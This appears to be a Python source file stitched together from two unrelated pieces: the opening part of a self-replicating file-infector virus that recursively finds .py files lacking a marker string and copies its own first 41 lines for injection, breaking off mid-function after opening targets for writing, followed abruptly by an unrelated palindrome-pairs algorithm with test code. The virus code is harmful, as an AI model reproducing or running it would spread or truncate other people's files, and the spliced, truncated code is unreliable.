#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 

def function(wordlist):
  #storing word in reverse format along with their indices.
   
    hashmap_reverse = {word[::-1]: index for index, word in enumerate(wordlist)}
    ans = []
    #enumerating over all words and for each character of them
    for index, word in enumerate(wordlist):
        for i in range(len(word)):
          #extracting left and right of them
            left, right = word[:i+1], word[i+1:]
            #checking if left exists and is palindrome and also right is present in map
            #this is to make sure the best edge case described holds.
             
            if not len(left) == 0 and left == left[::-1] and right in hashmap_reverse and hashmap_reverse[right] != index:
                ans.append([hashmap_reverse[right], index])
               
            #normal case.
            if right == right[::-1] and left in hashmap_reverse and hashmap_reverse[left] != index:
                ans.append([index, hashmap_reverse[left]])
    if len(ans)>0:
        return True
    return False
   
   
words = ["geekf", "geeks", "or","keeg", "abc", "bc"]
print(function(words))
# Time Complexity: O(nl) where n = length og array and l = length of longest string
# Space Complexity: O(n)